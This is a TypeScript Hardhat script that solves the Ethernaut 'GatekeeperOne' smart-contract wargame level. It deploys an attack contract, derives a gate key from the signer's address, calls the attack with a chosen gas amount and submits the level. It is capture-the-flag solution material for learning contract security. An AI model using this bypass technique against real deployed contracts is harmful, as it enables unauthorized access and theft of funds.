import { Signer } from 'ethers'
import { ethers } from 'hardhat'
import { GatekeeperOne, GatekeeperOneAttack } from '../typechain-types'
import { loadOrCreateLevelInstance, submitLevelInstance } from './ethernaut'
import { loadOrDeployContract, deployContract } from './helpers'

const levelAddress = '0x9b261b23cE149422DE75907C6ac0C30cEc4e652A'

const main = async () => {
  const signer = (await ethers.getSigners())[0] as Signer

  console.log(signer.getAddress())

  const targetContract = (await loadOrCreateLevelInstance('GatekeeperOne', levelAddress, signer)) as GatekeeperOne
  const attackContract = (await deployContract(
    'GatekeeperOneAttack',
    [targetContract.address],
    signer,
  )) as GatekeeperOneAttack

  let gas = 245984

  const address = await signer.getAddress()
  let key = ethers.utils.hexDataSlice(address, ethers.utils.hexDataLength(address) - 2)
  console.log({ key })
  key = ethers.utils.hexConcat(['0x110000000000', key])
  console.log({ key })

  const attackTxn = await attackContract.attack(key, gas, { gasLimit: 500000 })
  await attackTxn.wait()

  const entrant = await targetContract.entrant()

  console.log({ entrant })

  await submitLevelInstance(targetContract.address, signer)
}

main()
  .then(() => process.exit())
  .catch(e => {
    console.error(e)
    process.exit(1)
  })
